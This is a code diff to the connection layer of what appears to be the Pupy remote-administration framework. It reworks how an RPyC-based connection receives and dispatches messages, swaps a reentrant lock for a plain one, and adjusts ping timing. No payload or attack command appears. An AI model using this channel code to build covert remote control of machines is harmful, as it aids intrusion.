@@ -3,7 +3,7 @@
 import time
 
 from rpyc.core import Connection, consts
-from threading import Thread, RLock, Event, Lock
+from threading import Thread, Event, Lock
 
 if __debug__:
     import logging
@@ -106,11 +106,13 @@ class PupyConnection(Connection):
             if __debug__:
                 logger.debug('Sync poll until: {}'.format(seq))
             if self._connection_serve_lock.acquire(False):
+                data = None
                 try:
                     if __debug__:
                         logger.debug('Sync poll serve: {}'.format(seq))
 
-                    if not self.serve(self._serve_timeout):
+                    data = self.serve(self._serve_timeout)
+                    if not data:
                         if __debug__:
                             logger.debug('Sync poll serve interrupted: {}/inactive={}'.format(
                                 seq, self.inactive))
@@ -129,6 +131,10 @@ class PupyConnection(Connection):
                     if __debug__:
                         logger.debug('Sync poll serve complete. release: {}'.format(seq))
                     self._connection_serve_lock.release()
+
+                if data:
+                    self._dispatch(data)
+
             else:
                 if __debug__:
                     logger.debug('Sync poll wait: {}'.format(seq))
@@ -236,6 +242,8 @@ class PupyConnection(Connection):
         now = time.time()
         mintimeout = timeout
 
+        data = None
+
         with self._async_lock:
             for async_event in self._async_callbacks.itervalues():
                 if not async_event._ttl:
@@ -246,7 +254,7 @@ class PupyConnection(Connection):
                 if mintimeout is None or etimeout < mintimeout:
                     mintimeout = etimeout
 
-        served = Connection.serve(self, timeout=mintimeout)
+        data = self._recv(timeout, wait_for_lock = False)
 
         now = time.time()
 
@@ -263,7 +271,10 @@ class PupyConnection(Connection):
                     logger.debug('Send ping, interval: {}, timeout: {}'.format(interval, ping_timeout))
                 self._last_ping = self.ping(timeout=ping_timeout, now=now)
 
-        return served
+        return data
+
+    def dispatch(self, data):
+        self._dispatch(data)
 
     def ping(self, timeout=30, now=None):
         ''' RPyC do not have any PING handler. So.. why to wait? '''
@@ -277,7 +288,7 @@ class PupyConnectionThread(Thread):
             self.lock = getattr(kwargs, 'lock')
             del kwargs['lock']
         else:
-            self.lock = RLock()
+            self.lock = Lock()
 
         if __debug__:
             logger.debug('Create connection thread')
@@ -310,8 +321,9 @@ class PupyConnectionThread(Thread):
                 logger.debug('Start serve loop')
 
             while not self.connection.closed:
+                data = None
                 try:
-                    self.connection.serve()
+                    data = self.connection.serve()
                 except (EOFError, TypeError):
                     if __debug__:
                         logger.debug('Start serve loop')
@@ -321,3 +333,5 @@ class PupyConnectionThread(Thread):
 
                 except Exception, e:
                     logger.exception(e)
+
+                self.connection.dispatch(data)
